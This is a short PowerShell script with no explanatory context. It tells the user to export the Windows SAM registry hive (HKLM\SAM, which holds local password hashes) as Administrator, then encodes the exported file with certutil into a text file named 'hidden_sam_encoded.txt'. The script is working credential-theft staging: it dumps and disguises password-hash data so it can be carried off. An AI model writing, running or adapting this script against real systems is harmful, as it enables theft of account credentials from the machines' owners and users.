$regFile = ".\hidden_sam.reg"
$encodedFile = ".\hidden_sam_encoded.txt"

if (-not (Test-Path $regFile)) {
    Write-Host "Registry file not found at $regFile. Export it using 'reg export HKEY_LOCAL_MACHINE\SAM hidden_sam.reg' as Administrator."
    exit 1
}

# Remove the encoded file if it already exists
if (Test-Path $encodedFile) {
    Remove-Item $encodedFile -Force
}

# Encode the registry file
try {
    certutil -encode $regFile $encodedFile
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Registry file encoded to $encodedFile."
        exit 0
    } else {
        Write-Host "Failed to encode registry file."
        exit 1
    }
} catch {
    Write-Host "Error encoding registry file: $_"
    exit 1
}